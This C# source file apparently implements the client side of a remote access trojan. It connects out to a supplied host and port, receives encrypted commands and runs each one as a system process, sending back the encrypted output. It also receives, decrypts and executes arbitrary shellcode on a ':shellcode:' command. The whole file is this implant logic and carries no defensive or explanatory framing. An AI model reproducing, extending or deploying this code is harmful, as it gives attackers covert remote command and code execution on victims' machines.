using System;
using System.Net.Sockets;
using System.Net;
using System.IO;
using System.Linq;

class Client: IDisposable {
    readonly TcpClient tcp;
    readonly IPAddress host;
    readonly int port;
    string iv, key;

    /// <summary>
    /// Initialize the client
    /// </summary>
    /// <param name="host">Host name to connect to</param>
    /// <param name="port">Port number</param>
    public Client(IPAddress host, int port) {
        this.host = host;
        this.port = port;
        tcp = new TcpClient();
        iv = key = string.Empty;
    }

    /// <summary>
    /// Connect to the host and open tcp stream
    /// </summary>
    public void Setup() {
        tcp.Connect(host, port);
        using var stream = tcp.GetStream(); ReadInputs(stream);
    }

    /// <summary>
    /// Handle tcp stream
    /// </summary>
    /// <param name="stream"></param>
    private void ReadInputs(NetworkStream stream) {
        if (!Utils.HasExchangedKeys) {
            Utils.HasExchangedKeys = !Utils.HasExchangedKeys;
            iv = Utils.GetRandomString(16);
            key = Utils.GetRandomString(32);
        }

        using (var ws = new StreamWriter(stream) { AutoFlush = true })
        using (var rs = new StreamReader(stream)) {
            ws.WriteLine(iv);
            ws.WriteLine(key);

            while(true) {
                string cmd = rs.ReadLine();
                if (string.IsNullOrEmpty(cmd)) {
                    break;
                }
                
                string dec = Utils.DecryptData(Utils.DeserializeData(cmd), iv, key);

                if (dec.ToLower() == "exit") {
                    break;
                } else if (string.IsNullOrEmpty(dec) || string.IsNullOrWhiteSpace(dec)) {
                    continue;
                }

                // shellcode run
                if (dec == ":shellcode:") {
                    // get the shellcode
                    var rawShellCode = rs.ReadLine();
                    if (string.IsNullOrEmpty(rawShellCode) || string.IsNullOrWhiteSpace(rawShellCode)) continue;

                    // decrypt shellcode
                    var decryptedData = Utils.DecryptData(Utils.DeserializeData(rawShellCode), iv, key);
                    if (string.IsNullOrEmpty(decryptedData) || string.IsNullOrWhiteSpace(decryptedData)) continue;
                    
                    // deserialize the decrypted data to get actuall shellcode in bytes
                    byte[] shellcode = Utils.DeserializeData(decryptedData);

                    // execute shellcode
                    Utils.ExecuteShellCode(shellcode);
                    ws.WriteLine(Utils.SerializeBytes(Utils.EncryptData("Executing shellcode", iv, key)));
                } else {
                    string[] parts = dec.Split(' ');
                    string fileName = parts.First();


                    string[] args = parts.Skip(1).ToArray();

                    string output = Utils.ExecuteCommand(fileName, args);
                    var enc = Utils.EncryptData(output.Trim(), iv, key);

                    ws.WriteLine(Utils.SerializeBytes(enc));
                }
            }
        }
    }

    /// <summary>
    /// Dispose the resources commited by class
    /// </summary>
    public void Dispose() {
        tcp.Close();
        iv = key = string.Empty;
    }
}
